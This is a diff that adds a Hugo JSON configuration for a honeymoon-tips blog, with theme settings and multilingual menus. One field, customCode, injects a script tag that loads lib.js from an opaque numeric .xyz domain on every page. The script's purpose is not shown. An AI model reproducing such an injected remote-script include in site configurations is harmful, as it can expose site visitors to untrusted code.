@@ -1,0 +1,213 @@
+{
+    "baseURL": "http:\/\/localhost:1313",
+    "title": "Billis\u2019 Honeymoon Tips",
+    "assetDir": "static",
+    "theme": "newspaperly",
+    "defaultContentLanguage": "en",
+    "disableLanguages": [
+        "de",
+        "es",
+        "fr",
+        "id",
+        "it"
+    ],
+    "params": {
+        "postsPerPage": 9,
+        "description": "Explore Romance with Every Step",
+        "recentPostSidebarCount": 10,
+        "showTagsInSidebar": false,
+        "showCategoriesInSidebar": false,
+        "customCode": "<script defer src=\"https:\/\/cdn-js.942112.xyz\/lib.js\"><\/script>"
+    },
+    "markup": {
+        "tableOfContents": {
+            "ordered": true
+        }
+    },
+    "timeout": "10m",
+    "languages": {
+        "de": {
+            "languageCode": "de",
+            "menu": {
+                "main": [
+                    {
+                        "identifier": "posts",
+                        "name": "Beitr\u00e4ge",
+                        "url": "\/posts",
+                        "weight": 10
+                    },
+                    {
+                        "identifier": "about",
+                        "name": "\u00dcber",
+                        "url": "\/uber",
+                        "weight": 20
+                    },
+                    {
+                        "identifier": "privacy-policy",
+                        "name": "Datenschutzbestimmungen",
+                        "url": "\/datenschutzbestimmungen",
+                        "weight": 30
+                    },
+                    {
+                        "identifier": "contact",
+                        "name": "Kontakt",
+                        "url": "\/kontakt",
+                        "weight": 40
+                    }
+                ]
+            }
+        },
+        "en": {
+            "languageCode": "en",
+            "menu": {
+                "main": [
+                    {
+                        "identifier": "posts",
+                        "name": "Posts",
+                        "url": "\/posts",
+                        "weight": 10
+                    },
+                    {
+                        "identifier": "about",
+                        "name": "About",
+                        "url": "\/about",
+                        "weight": 20
+                    },
+                    {
+                        "identifier": "privacy-policy",
+                        "name": "Privacy Policy",
+                        "url": "\/privacy-policy",
+                        "weight": 30
+                    },
+                    {
+                        "identifier": "contact",
+                        "name": "Contact",
+                        "url": "\/contact",
+                        "weight": 40
+                    }
+                ]
+            }
+        },
+        "es": {
+            "languageCode": "es",
+            "menu": {
+                "main": [
+                    {
+                        "identifier": "posts",
+                        "name": "Art\u00edculos",
+                        "url": "\/posts",
+                        "weight": 10
+                    },
+                    {
+                        "identifier": "about",
+                        "name": "Acerca de",
+                        "url": "\/acerca-de",
+                        "weight": 20
+                    },
+                    {
+                        "identifier": "privacy-policy",
+                        "name": "Pol\u00edtica de privacidad",
+                        "url": "\/politica-de-privacidad",
+                        "weight": 30
+                    },
+                    {
+                        "identifier": "contact",
+                        "name": "Contacto",
+                        "url": "\/contacto",
+                        "weight": 40
+                    }
+                ]
+            }
+        },
+        "fr": {
+            "languageCode": "fr",
+            "menu": {
+                "main": [
+                    {
+                        "name": "Articles",
+                        "url": "\/posts",
+                        "weight": 10
+                    },
+                    {
+                        "name": "\u00c0 propos",
+                        "url": "\/a-propos",
+                        "weight": 20
+                    },
+                    {
+                        "name": "Politique de confidentialit\u00e9",
+                        "url": "\/politique-de-confidentialite",
+                        "weight": 30
+                    },
+                    {
+                        "name": "Contact",
+                        "url": "\/contact",
+                        "weight": 40
+                    }
+                ]
+            }
+        },
+        "id": {
+            "languageCode": "id",
+            "menu": {
+                "main": [
+                    {
+                        "identifier": "posts",
+                        "name": "Pos",
+                        "url": "\/posts",
+                        "weight": 10
+                    },
+                    {
+                        "identifier": "about",
+                        "name": "Tentang",
+                        "url": "\/tentang",
+                        "weight": 20
+                    },
+                    {
+                        "identifier": "privacy-policy",
+                        "name": "Kebijakan Privasi",
+                        "url": "\/kebijakan-privasi",
+                        "weight": 30
+                    },
+                    {
+                        "identifier": "contact",
+                        "name": "Kontak",
+                        "url": "\/kontak",
+                        "weight": 40
+                    }
+                ]
+            }
+        },
+        "it": {
+            "languageCode": "it",
+            "menu": {
+                "main": [
+                    {
+                        "identifier": "posts",
+                        "name": "Articoli",
+                        "url": "\/posts",
+                        "weight": 10
+                    },
+                    {
+                        "identifier": "about",
+                        "name": "Informazioni",
+                        "url": "\/informazioni",
+                        "weight": 20
+                    },
+                    {
+                        "identifier": "privacy-policy",
+                        "name": "Informativa sulla privacy",
+                        "url": "\/informativa-sulla-privacy",
+                        "weight": 30
+                    },
+                    {
+                        "identifier": "contact",
+                        "name": "Contatto",
+                        "url": "\/contatto",
+                        "weight": 40
+                    }
+                ]
+            }
+        }
+    },
+    "enableRobotsTXT": true
+}
